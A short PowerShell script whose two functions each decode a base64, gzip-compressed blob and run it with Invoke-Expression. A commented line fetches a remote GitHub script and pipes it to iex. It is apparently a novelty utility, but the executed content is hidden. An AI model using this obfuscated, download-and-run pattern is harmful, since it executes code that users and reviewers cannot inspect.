function Where-Left {
    $bd=[Convert]::FromBase64String('H4sIAAAAAAAEAFNQUFBQSihKyPPx8VHSMjTg5QIKKKjb2NoqhGRkFisAUU5qWok6RFwJqAqkGKQSALZ9jbQ6AAAA');$ms=New-Object IO.MemoryStream;$ms.Write($bd,0,$bd.Length);$null=$ms.Seek(0,0);(New-Object IO.StreamReader((New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]0)))).ReadToEnd()|Invoke-Expression
}
function Where-Right {
    $bd=[Convert]::FromBase64String('H4sIAAAAAAAEAFNQUFBQUtFQV1DX0lDJyC8u0Qv11AtKLAeSTqVpaalFwZlVqXrhmSklGbrGmppBQUFKWoYGvFwKJOgztNDUVAjJyCxWAKKizPSMEgVbWzsl0gxBWA4AngMre7MAAAA=');$ms=New-Object IO.MemoryStream;$ms.Write($bd,0,$bd.Length);$null=$ms.Seek(0,0);(New-Object IO.StreamReader((New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]0)))).ReadToEnd()|Invoke-Expression
}
#  "$(Invoke-WebRequest https://raw.githubusercontent.com/jaapbrasser/UtilityScripts/master/Invoke-JeanDamien.ps1)" -replace '^.*?f','f'|iex